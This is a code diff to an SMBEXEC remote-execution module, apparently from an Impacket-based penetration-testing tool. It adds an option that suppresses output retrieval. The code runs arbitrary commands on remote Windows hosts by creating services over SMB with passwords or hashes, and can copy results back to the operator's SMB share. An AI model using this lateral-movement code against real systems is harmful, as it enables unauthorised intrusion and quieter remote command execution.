@@ -50,8 +50,8 @@ class SMBEXEC:
         '445/SMB': (r'ncacn_np:%s[\pipe\svcctl]', 445),
         }
 
-    def __init__(self, command, protocols = None, 
-                 username = '', password = '', domain = '', hashes = None, aesKey = None, doKerberos = None, mode = None, share = None):
+    def __init__(self, command, protocols = None, username = '', password = '', domain = '', hashes = None, aesKey = None, doKerberos = None, mode = None, share = None, noOutput=False):
+        
         if not protocols:
             protocols = SMBEXEC.KNOWN_PROTOCOLS.keys()
 
@@ -65,6 +65,7 @@ class SMBEXEC:
         self.__nthash = ''
         self.__aesKey = aesKey
         self.__doKerberos = doKerberos
+        self.__noOutput = noOutput
         self.__share = share
         self.__mode  = mode
         self.shell = None
@@ -96,7 +97,7 @@ class SMBEXEC:
                 if self.__mode == 'SERVER':
                     serverThread = SMBServer()
                     serverThread.start()
-                self.shell = RemoteShell(self.__share, rpctransport, self.__mode, self.__serviceName)
+                self.shell = RemoteShell(self.__share, rpctransport, self.__mode, self.__serviceName, self.__noOutput)
                 self.shell.onecmd(self.__command)
                 self.shell.finish()
                 if self.__mode == 'SERVER':
@@ -107,7 +108,7 @@ class SMBEXEC:
                     self.shell.finish()
 
 class RemoteShell(cmd.Cmd):
-    def __init__(self, share, rpc, mode, serviceName):
+    def __init__(self, share, rpc, mode, serviceName, noOutput):
         cmd.Cmd.__init__(self)
         self.__share = share
         self.__mode = mode
@@ -117,6 +118,7 @@ class RemoteShell(cmd.Cmd):
         self.__command = ''
         self.__shell = '%COMSPEC% /Q /c '
         self.__serviceName = serviceName
+        self.__noOutput = noOutput
         self.__rpc = rpc
         self.intro = '[!] Launching semi-interactive shell - Careful what you execute'
 
@@ -127,19 +129,22 @@ class RemoteShell(cmd.Cmd):
             logging.critical(str(e))
             sys.exit(1)
 
-        s = rpc.get_smb_connection()
-
-        # We don't wanna deal with timeouts from now on.
-        s.setTimeout(100000)
-        if mode == 'SERVER':
-            myIPaddr = s.getSMBServer().get_socket().getsockname()[0]
-            self.__copyBack = 'copy %s \\\\%s\\%s' % (self.__output, myIPaddr, DUMMY_SHARE)
-
         self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
         resp = scmr.hROpenSCManagerW(self.__scmr)
         self.__scHandle = resp['lpScHandle']
-        self.transferClient = rpc.get_smb_connection()
-        self.do_cd('')
+
+        if self.__noOutput is False:
+            s = rpc.get_smb_connection()
+            # We don't wanna deal with timeouts from now on.
+            s.setTimeout(100000)
+            self.transferClient = rpc.get_smb_connection()
+            if mode == 'SERVER':
+                myIPaddr = s.getSMBServer().get_socket().getsockname()[0]
+                self.__copyBack = 'copy %s \\\\%s\\%s' % (self.__output, myIPaddr, DUMMY_SHARE)
+        else:
+            logging.info('Output retrieval disabled')
+
+        #self.do_cd('')
 
     def finish(self):
         # Just in case the service is still created
@@ -188,6 +193,10 @@ class RemoteShell(cmd.Cmd):
         def output_callback(data):
             self.__outputBuffer += data
 
+        if self.__noOutput is True:
+            self.__outputBuffer = ''
+            return
+
         if self.__mode == 'SHARE':
             self.transferClient.getFile(self.__share, self.__output, output_callback)
             self.transferClient.deleteFile(self.__share, self.__output)
@@ -198,10 +207,16 @@ class RemoteShell(cmd.Cmd):
             os.unlink(SMBSERVER_DIR + '/' + OUTPUT_FILENAME)
 
     def execute_remote(self, data):
-        command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' 2^>^&1 > ' + self.__batchFile + ' & ' + self.__shell + self.__batchFile 
-        if self.__mode == 'SERVER':
-            command += ' & ' + self.__copyBack
+        if self.__noOutput is False:
+            command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' 2^>^&1 > ' + self.__batchFile + ' & ' + self.__shell + self.__batchFile 
+            if self.__mode == 'SERVER':
+                command += ' & ' + self.__copyBack
+        else:
+            command = self.__shell + 'echo ' + data + ' 2^>^&1 > ' + self.__batchFile + ' & ' + self.__shell + self.__batchFile 
+
         command += ' & ' + 'del ' + self.__batchFile 
+
+        logging.info('Command in batch file: {}'.format(command))
 
         resp = scmr.hRCreateServiceW(self.__scmr, self.__scHandle, self.__serviceName, self.__serviceName, lpBinaryPathName=command)
         service = resp['lpServiceHandle']
@@ -218,5 +233,6 @@ class RemoteShell(cmd.Cmd):
         self.execute_remote(data)
         peer = ':'.join(map(str, self.__rpc.get_socket().getpeername()))
         print_succ("{} Executed command via SMBEXEC".format(peer))
-        print_att(self.__outputBuffer.strip())
+        if self.__noOutput is False:
+            print_att(self.__outputBuffer.strip())
         self.__outputBuffer = ''
